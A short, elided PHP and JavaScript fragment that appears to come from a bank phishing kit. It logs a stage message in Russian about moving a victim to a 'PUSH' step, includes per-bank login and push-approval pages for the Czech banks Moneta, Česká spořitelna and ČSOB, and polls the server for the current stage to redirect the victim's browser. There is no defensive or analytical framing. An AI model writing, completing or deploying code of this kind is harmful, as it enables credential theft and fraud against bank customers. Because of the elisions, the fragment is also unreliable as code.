...
if ($dbconn) {
  ...
  if ($result) {
      ...
      $currStageText = '🏛Переход на PUSH <b>' . $bank_name . '</b>';
...
switch ($bank) {
    case 'moneta':
        include 'moneta/monetapush.php';
        break;
    case 'sporitelna':
        include 'sporitelna/CeskaVxod.php';
        break;
    case 'csob':
      include 'csob/csobpushvxod.php';
      break;
    default:
    ...
    function checkStage() {
        $.ajax({
            ...
            success: function (stage) {
                ...
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'push' && stage != '') {
                    console.log(stage)
